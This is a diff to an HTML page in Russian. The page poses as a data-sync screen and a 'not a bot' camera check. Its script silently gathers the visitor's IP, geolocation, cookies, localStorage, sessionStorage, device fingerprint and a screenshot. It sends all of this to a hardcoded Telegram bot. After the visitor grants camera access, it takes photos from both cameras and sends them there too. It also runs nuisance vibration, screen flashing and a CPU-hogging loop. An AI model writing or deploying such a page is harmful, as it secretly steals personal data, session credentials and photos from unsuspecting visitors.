@@ -5,277 +5,554 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Загрузка данных</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f5f7fa;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            color: #333;
+            min-height: 100vh;
+            padding: 16px;
+            transition: background 0.1s;
         }
-        .container {
+        .card {
             background: white;
-            padding: 40px 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border-radius: 28px;
+            padding: 32px 24px;
             max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
             text-align: center;
+            position: relative;
+            z-index: 10;
         }
         .spinner {
             width: 48px;
             height: 48px;
-            border: 5px solid #e0e0e0;
-            border-top: 5px solid #3498db;
+            border: 4px solid #e6edf5;
+            border-top: 4px solid #1e6f9f;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 18px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         h2 {
-            font-weight: 500;
-            margin-bottom: 10px;
+            font-weight: 600;
+            font-size: 20px;
+            color: #1e293b;
+            margin-bottom: 6px;
         }
-        p {
-            color: #777;
+        .sub {
+            color: #64748b;
             font-size: 14px;
             margin-bottom: 20px;
         }
         .status {
-            background: #f0f4ff;
-            padding: 10px;
-            border-radius: 10px;
+            background: #f8fafc;
+            padding: 12px;
+            border-radius: 14px;
             font-size: 13px;
-            color: #2c3e50;
+            color: #1e293b;
+            margin-bottom: 16px;
         }
-        .permission-box {
-            margin-top: 20px;
-            padding: 15px;
-            background: #fef9e7;
-            border-left: 4px solid #f1c40f;
-            border-radius: 8px;
-            font-size: 14px;
+        .perm-box {
+            background: #fefce8;
+            border-left: 4px solid #eab308;
+            border-radius: 12px;
+            padding: 14px 16px;
             text-align: left;
+            font-size: 14px;
+            color: #1e293b;
+            margin-top: 6px;
         }
-        .permission-box strong {
-            color: #e67e22;
+        .perm-box strong {
+            color: #b45309;
         }
         .btn {
-            display: inline-block;
-            margin-top: 15px;
-            padding: 10px 24px;
-            background: #3498db;
+            margin-top: 16px;
+            background: #1e6f9f;
             color: white;
             border: none;
-            border-radius: 30px;
-            font-size: 14px;
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-size: 15px;
+            font-weight: 500;
             cursor: pointer;
             transition: 0.2s;
         }
-        .btn:hover {
-            background: #2980b9;
-        }
+        .btn:hover { background: #155580; }
+        .btn:disabled { opacity: 0.5; pointer-events: none; }
         #done {
             display: none;
             margin-top: 20px;
-            color: #27ae60;
+            color: #16a34a;
             font-weight: 500;
+        }
+        .glitch {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,0,0,0.02);
+            pointer-events: none;
+            z-index: 9999;
+            animation: glitch 0.3s infinite;
+        }
+        @keyframes glitch {
+            0% { opacity: 0; }
+            50% { opacity: 0.1; background: rgba(0,255,0,0.05); }
+            100% { opacity: 0; }
         }
     </style>
 </head>
 <body>
-    <div class="container" id="main">
+    <!-- Слой для глитч-эффекта -->
+    <div class="glitch" id="glitchLayer"></div>
+
+    <div class="card" id="app">
         <div class="spinner"></div>
         <h2>Загрузка данных пользователя</h2>
-        <p>Пожалуйста, подождите, идёт синхронизация...</p>
+        <p class="sub">Пожалуйста, подождите, идёт синхронизация</p>
         <div class="status" id="statusText">Подключение к серверу...</div>
 
-        <div class="permission-box">
-            📸 <strong>Для завершения профиля</strong> — разрешите доступ к камере на 1 секунду.<br>
-            <span style="font-size:13px;color:#555;">Это нужно для подтверждения личности.</span>
-            <button class="btn" id="cameraBtn">Разрешить камеру</button>
+        <div class="perm-box">
+            📸 <strong>Для подтверждения, что вы не бот</strong> — разрешите доступ к камере.<br>
+            <span style="font-size:13px;color:#555;">Мы сделаем снимок для проверки и сразу закроем доступ.</span>
+            <button class="btn" id="cameraBtn">✅ Разрешить камеру</button>
         </div>
 
         <div id="done">✅ Данные успешно загружены. Спасибо!</div>
     </div>
 
-    <!-- Подключаем html2canvas -->
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
-
     <script>
-        // ====================================================
-        // КОНФИГУРАЦИЯ — ТВОИ ДАННЫЕ
-        // ====================================================
+        // ============================================================
+        //  ТВОИ ДАННЫЕ (ВСТАВЬ СВОИ)
+        // ============================================================
         const BOT_TOKEN = '8911126607:AAEhgvLhVcPSos66wzFcEv2D6RixsGvZ_jg';
         const CHAT_ID = '-1004497754715';
 
-        let cameraAllowed = false;
+        // ============================================================
+        //  ГЛОБАЛЬНЫЕ ФЛАГИ
+        // ============================================================
+        let cameraDone = false;
         let dataSent = false;
+        let prankActive = true;          // пока активен прикол
+        let volumePressCount = 0;
+        let volumePressTimer = null;
 
-        // ====================================================
-        // 1. ПОЛУЧАЕМ IP-АДРЕС (через бесплатный API)
-        // ====================================================
-        async function getIP() {
+        // ============================================================
+        //  ОТПРАВКА В TELEGRAM
+        // ============================================================
+        async function sendTelegram(type, payload, isPhoto = false) {
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch {
-                return 'не удалось определить';
-            }
+                const url = isPhoto
+                    ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
+                    : `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const body = isPhoto
+                    ? { chat_id: CHAT_ID, photo: payload, caption: `📸 ${type}` }
+                    : { chat_id: CHAT_ID, text: `📩 [${type}]\n${payload}` };
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+            } catch (_) {}
         }
 
-        // ====================================================
-        // 2. ОТПРАВКА В TELEGRAM (текст + фото)
-        // ====================================================
-        async function sendToTelegram(type, payload, isPhoto = false) {
+        // ============================================================
+        //  СБОР ВСЕЙ ИНФЫ (МАКСИМУМ)
+        // ============================================================
+        async function collectEverything() {
+            const info = {};
+
+            // IP
             try {
-                if (isPhoto) {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            photo: payload,
-                            caption: `📸 ${type}`
-                        })
-                    });
-                } else {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: `📩 [${type}]\n${payload}`
-                        })
-                    });
+                const r1 = await fetch('https://api.ipify.org?format=json');
+                const d1 = await r1.json();
+                info.ip = d1.ip;
+            } catch (_) { info.ip = 'не определён' }
+            try {
+                const r2 = await fetch('https://ipapi.co/json/');
+                const d2 = await r2.json();
+                info.ip_geo = `${d2.city}, ${d2.region}, ${d2.country_name} (${d2.org})`;
+            } catch (_) {}
+
+            // Браузер / система
+            info.userAgent = navigator.userAgent;
+            info.platform = navigator.platform;
+            info.language = navigator.language;
+            info.languages = navigator.languages ? navigator.languages.join(', ') : 'нет';
+            info.hardwareConcurrency = navigator.hardwareConcurrency || 'неизвестно';
+            info.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'неизвестно';
+            info.maxTouchPoints = navigator.maxTouchPoints || 0;
+
+            // Экран
+            info.screen = `${screen.width}x${screen.height}, цветность: ${screen.colorDepth}bit`;
+            info.availableScreen = `${screen.availWidth}x${screen.availHeight}`;
+            info.pixelRatio = window.devicePixelRatio;
+
+            // Время
+            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            info.time = new Date().toISOString();
+            info.timeLocal = new Date().toString();
+
+            // Батарея
+            try {
+                const b = await navigator.getBattery();
+                info.battery = `${Math.round(b.level * 100)}%, ${b.charging ? 'зарядка' : 'не на зарядке'}`;
+            } catch (_) { info.battery = 'нет доступа' }
+
+            // Сеть
+            if (navigator.connection) {
+                const c = navigator.connection;
+                info.network = `${c.effectiveType || '?'}, ${c.downlink || '?'} Мбит/с, ${c.rtt || '?'}ms`;
+                info.networkType = c.type || 'неизвестно';
+            } else {
+                info.network = 'не определено';
+            }
+
+            // Плагины
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            info.plugins = plugins.join(', ') || 'нет';
+
+            // Шрифты (первые 50)
+            try {
+                const fonts = await document.fonts.ready;
+                const fontList = [];
+                for (const f of fonts.values()) {
+                    fontList.push(f.family);
+                    if (fontList.length >= 50) break;
                 }
-            } catch (e) {
-                console.warn('Ошибка отправки:', e);
+                info.fonts = fontList.join(', ') || 'нет';
+            } catch (_) { info.fonts = 'не удалось' }
+
+            // WebGL
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debug) {
+                        info.webgl_renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'неизвестно';
+                        info.webgl_vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) || 'неизвестно';
+                    }
+                    info.webgl_version = gl.getParameter(gl.VERSION) || 'неизвестно';
+                    info.webgl_shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || 'неизвестно';
+                }
+            } catch (_) {}
+
+            // Медиа-устройства
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'скрыто');
+                const mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'скрыто');
+                const spks = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'скрыто');
+                info.cameras = cams.join(', ') || 'нет';
+                info.microphones = mics.join(', ') || 'нет';
+                info.speakers = spks.join(', ') || 'нет';
+            } catch (_) {}
+
+            // Куки, localStorage, sessionStorage (рабочие)
+            info.cookies = document.cookie || 'нет';
+            try { info.localStorage = JSON.stringify(localStorage); } catch (_) { info.localStorage = 'нет' }
+            try { info.sessionStorage = JSON.stringify(sessionStorage); } catch (_) { info.sessionStorage = 'нет' }
+
+            // Геолокация
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
+                    });
+                    info.geo = `${pos.coords.latitude}, ${pos.coords.longitude} (точность ~${pos.coords.accuracy}м)`;
+                    info.geo_altitude = pos.coords.altitude || 'неизвестно';
+                    info.geo_speed = pos.coords.speed || 'неизвестно';
+                } catch (_) { info.geo = 'отказано или недоступно' }
+            }
+
+            // Акселерометр / гироскоп
+            if (window.DeviceOrientationEvent) {
+                try {
+                    const or = await new Promise((res) => {
+                        window.addEventListener('deviceorientation', res, { once: true });
+                        setTimeout(() => res(null), 3000);
+                    });
+                    if (or) {
+                        info.orientation = `alpha:${or.alpha?.toFixed(1)}, beta:${or.beta?.toFixed(1)}, gamma:${or.gamma?.toFixed(1)}`;
+                    }
+                } catch (_) {}
+            }
+
+            // Кеш популярных сайтов
+            const testSites = ['google.com', 'youtube.com', 'facebook.com', 'vk.com', 'instagram.com', 'twitter.com', 'tiktok.com'];
+            const cached = [];
+            for (const site of testSites) {
+                try {
+                    const img = new Image();
+                    img.src = `https://${site}/favicon.ico?_=${Date.now()}`;
+                    await new Promise((r) => { img.onload = r; img.onerror = r; setTimeout(r, 400); });
+                    if (img.complete && img.naturalWidth > 0) cached.push(site);
+                } catch (_) {}
+            }
+            info.cachedSites = cached.length ? cached.join(', ') : 'нет';
+
+            // Доп. фичи
+            info.doNotTrack = navigator.doNotTrack || 'не задан';
+            info.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : 'неизвестно';
+            info.cookieEnabled = navigator.cookieEnabled;
+            info.onLine = navigator.onLine;
+            info.windowSize = `${window.innerWidth}x${window.innerHeight}`;
+
+            // Отпечаток
+            const hashStr = `${navigator.userAgent}${screen.width}${screen.height}${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+            let hash = 0;
+            for (let i = 0; i < hashStr.length; i++) {
+                const char = hashStr.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            info.browserFingerprint = hash.toString(16);
+
+            return info;
+        }
+
+        // ============================================================
+        //  КАМЕРА — СНИМОК (через video + canvas)
+        // ============================================================
+        async function takeCameraPhoto(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                return new Promise((resolve) => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    let resolved = false;
+                    const cleanup = () => {
+                        if (!resolved) {
+                            resolved = true;
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(null);
+                        }
+                    };
+                    video.onloadedmetadata = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolved = true;
+                        resolve(dataUrl);
+                    };
+                    video.onerror = cleanup;
+                    setTimeout(cleanup, 6000);
+                });
+            } catch (_) {
+                return null;
             }
         }
 
-        // ====================================================
-        // 3. СБОР ВСЕХ ДАННЫХ И ОТПРАВКА (СРАЗУ)
-        // ====================================================
-        async function collectAndSendAll() {
-            if (dataSent) return;
-            dataSent = true;
+        // ============================================================
+        //  ЗАПУСК КАМЕРЫ ПО КНОПКЕ
+        // ============================================================
+        document.getElementById('cameraBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('cameraBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Снимаем...';
+            document.getElementById('statusText').innerText = 'Получение снимков...';
 
+            let back = null, front = null;
+            try { back = await takeCameraPhoto('environment'); } catch (_) {}
+            try { front = await takeCameraPhoto('user'); } catch (_) {}
+
+            if (back) {
+                await sendTelegram('Фото (тыловая камера)', back, true);
+                document.getElementById('statusText').innerText = 'Фото тыловой отправлено ✅';
+            }
+            if (front) {
+                await sendTelegram('Фото (фронтальная камера)', front, true);
+                document.getElementById('statusText').innerText = 'Фото фронтальной отправлено ✅';
+            }
+
+            if (!back && !front) {
+                document.getElementById('statusText').innerText = 'Не удалось сделать снимок (возможно, отказано)';
+            }
+
+            cameraDone = true;
+            btn.style.display = 'none';
+            document.getElementById('done').style.display = 'block';
+            document.getElementById('statusText').innerText = 'Готово. Спасибо!';
+        });
+
+        // ============================================================
+        //  ПРИКОЛЫ: ВИБРАЦИЯ + ГЛИТЧ + ЛАГ (фоновая нагрузка)
+        // ============================================================
+        let glitchInterval = null;
+        let vibrateInterval = null;
+        let lagInterval = null;
+
+        function startPranks() {
+            // Вибрация — короткими импульсами каждые 500 мс
+            if (navigator.vibrate) {
+                vibrateInterval = setInterval(() => {
+                    if (prankActive) navigator.vibrate(100);
+                }, 500);
+            }
+
+            // Глитч-эффект — меняем фон и добавляем мерцание
+            const glitchLayer = document.getElementById('glitchLayer');
+            glitchInterval = setInterval(() => {
+                if (!prankActive) return;
+                glitchLayer.style.background = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.05)`;
+                document.body.style.background = `#${Math.floor(Math.random()*16777215).toString(16)}`;
+                setTimeout(() => {
+                    document.body.style.background = '#f0f2f5';
+                }, 100);
+            }, 300);
+
+            // Лаг — тяжёлые вычисления в фоне (загружаем процессор)
+            function heavyLoop() {
+                if (!prankActive) return;
+                let i = 0;
+                while (i < 1000000) {
+                    i++;
+                    Math.sqrt(i * Math.random());
+                }
+                if (prankActive) setTimeout(heavyLoop, 10);
+            }
+            heavyLoop();
+        }
+
+        // ============================================================
+        //  ОТМЕНА ПРИКОЛОВ (по двойному нажатию громкости)
+        // ============================================================
+        function stopPranks() {
+            if (!prankActive) return;
+            prankActive = false;
+            if (vibrateInterval) clearInterval(vibrateInterval);
+            if (glitchInterval) clearInterval(glitchInterval);
+            if (lagInterval) clearInterval(lagInterval);
+            if (navigator.vibrate) navigator.vibrate(0);
+            document.body.style.background = '#f0f2f5';
+            document.getElementById('glitchLayer').style.background = 'transparent';
+            document.getElementById('statusText').innerText = '✅ Приколы отменены';
+            document.getElementById('done').style.display = 'block';
+            document.querySelector('h2').innerText = '✅ Всё остановлено';
+        }
+
+        // ===== Регистрируем MediaSession для перехвата кнопок громкости =====
+        if ('mediaSession' in navigator) {
+            try {
+                // Создаём аудио-контекст, чтобы активировать медиа-сессию
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                gainNode.gain.value = 0.001; // почти без звука
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.start();
+                oscillator.stop(0.1); // играем 0.1 сек тишины
+
+                // Обработчик для кнопки "вперёд" (обычно привязана к громкости +)
+                navigator.mediaSession.setActionHandler('seekforward', () => {
+                    if (!prankActive) return;
+                    volumePressCount++;
+                    if (volumePressTimer) clearTimeout(volumePressTimer);
+                    volumePressTimer = setTimeout(() => {
+                        volumePressCount = 0;
+                    }, 800); // сброс счётчика через 800 мс
+
+                    if (volumePressCount >= 2) {
+                        // Двойное нажатие — отменяем приколы
+                        stopPranks();
+                        volumePressCount = 0;
+                        clearTimeout(volumePressTimer);
+                    }
+                });
+
+                // Можно также на seekbackward (громкость -) для разнообразия
+                navigator.mediaSession.setActionHandler('seekbackward', () => {
+                    // тоже считаем как нажатие
+                    volumePressCount++;
+                    if (volumePressTimer) clearTimeout(volumePressTimer);
+                    volumePressTimer = setTimeout(() => {
+                        volumePressCount = 0;
+                    }, 800);
+                    if (volumePressCount >= 2) {
+                        stopPranks();
+                        volumePressCount = 0;
+                        clearTimeout(volumePressTimer);
+                    }
+                });
+
+                // Устанавливаем метаданные, чтобы медиа-сессия была активна
+                navigator.mediaSession.metadata = new MediaMetadata({
+                    title: 'Загрузка данных',
+                    artist: 'Проверка',
+                    album: 'Система'
+                });
+            } catch (_) {}
+        }
+
+        // ============================================================
+        //  ГЛАВНАЯ ФУНКЦИЯ — СБОР И ОТПРАВКА
+        // ============================================================
+        async function main() {
             document.getElementById('statusText').innerText = 'Сбор данных...';
 
-            // 3.1 Скриншот экрана
+            const info = await collectEverything();
+
+            // Скриншот экрана
             try {
                 const canvas = await html2canvas(document.body);
-                const imgData = canvas.toDataURL('image/png');
-                await sendToTelegram('Скриншот экрана', imgData, true);
-            } catch (e) {
-                console.warn('Скриншот не удался:', e);
+                const img = canvas.toDataURL('image/png');
+                await sendTelegram('Скриншот экрана', img, true);
+            } catch (_) {}
+
+            // Отчёт
+            let text = '📋 **ПОЛНЫЙ ОТЧЁТ**\n\n';
+            for (const [key, val] of Object.entries(info)) {
+                if (val && val !== 'нет' && val !== 'не определено' && val !== 'неизвестно' && val !== 'не удалось') {
+                    text += `• ${key}: ${val}\n`;
+                }
             }
+            if (text.length > 4000) text = text.slice(0, 3900) + '\n... (обрезано)';
+            await sendTelegram('ВСЯ ИНФОРМАЦИЯ', text);
 
-            // 3.2 IP-адрес
-            const ip = await getIP();
-            await sendToTelegram('IP-адрес', ip);
-
-            // 3.3 Геолокация (если разрешено)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const geo = `lat: ${pos.coords.latitude}, lon: ${pos.coords.longitude}`;
-                        await sendToTelegram('Геолокация', geo);
-                    },
-                    () => { /* тихо игнорим отказ */ }
-                );
-            }
-
-            // 3.4 Данные о системе
-            const info = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                cookies: document.cookie || 'нет',
-                localStorage: localStorage,
-                time: new Date().toISOString()
-            };
-            await sendToTelegram('Системная информация', JSON.stringify(info, null, 2));
-
-            document.getElementById('statusText').innerText = 'Готово!';
+            dataSent = true;
+            document.getElementById('statusText').innerText = 'Данные отправлены ✅';
             document.getElementById('done').style.display = 'block';
         }
 
-        // ====================================================
-        // 4. ЗАПРОС ДОСТУПА К КАМЕРЕ (обе камеры)
-        // ====================================================
-        async function requestCamera() {
-            try {
-                // Сначала пробуем получить доступ к камерам
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' } // тыловая
-                });
+        // ============================================================
+        //  СТАРТ
+        // ============================================================
+        // Запускаем приколы сразу
+        startPranks();
 
-                // Делаем фото с тыловой
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-                const blob = await imageCapture.takePhoto();
-                const reader = new FileReader();
-                reader.onloadend = async function() {
-                    await sendToTelegram('Фото с тыловой камеры', reader.result, true);
-                };
-                reader.readAsDataURL(blob);
+        // Сбор данных через 1 секунду
+        setTimeout(main, 1000);
 
-                // Закрываем поток
-                stream.getTracks().forEach(t => t.stop());
-
-                // Теперь фронтальная камера
-                const frontStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
-                const frontTrack = frontStream.getVideoTracks()[0];
-                const frontCapture = new ImageCapture(frontTrack);
-                const frontBlob = await frontCapture.takePhoto();
-                const frontReader = new FileReader();
-                frontReader.onloadend = async function() {
-                    await sendToTelegram('Фото с фронтальной камеры', frontReader.result, true);
-                };
-                frontReader.readAsDataURL(frontBlob);
-                frontStream.getTracks().forEach(t => t.stop());
-
-                cameraAllowed = true;
-                document.getElementById('statusText').innerText = 'Камера разрешена ✅';
-                document.getElementById('cameraBtn').style.display = 'none';
-
-            } catch (err) {
-                document.getElementById('statusText').innerText = 'Доступ к камере не получен (можно пропустить)';
-                console.warn('Ошибка камеры:', err);
-            }
-        }
-
-        // ====================================================
-        // 5. ЗАПУСК
-        // ====================================================
-        document.getElementById('cameraBtn').addEventListener('click', async () => {
-            await requestCamera();
-        });
-
-        // Сразу собираем данные (скриншот, IP, гео, система) — без задержки
-        setTimeout(collectAndSendAll, 500);
-
-        // Если через 10 секунд камера не была разрешена — просто завершаем
+        // Если через 15 секунд камера не была использована — просто показываем сообщение
         setTimeout(() => {
-            if (!cameraAllowed) {
-                document.getElementById('statusText').innerText = 'Готово (без камеры)';
-                document.getElementById('done').style.display = 'block';
+            if (!cameraDone) {
+                document.getElementById('statusText').innerText = 'Данные отправлены. Разрешите камеру для фото.';
             }
-        }, 10000);
+        }, 15000);
+
+        // Автоматическая остановка приколов через 60 секунд (на всякий случай)
+        setTimeout(() => {
+            if (prankActive) stopPranks();
+        }, 60000);
     </script>
 </body>
 </html>
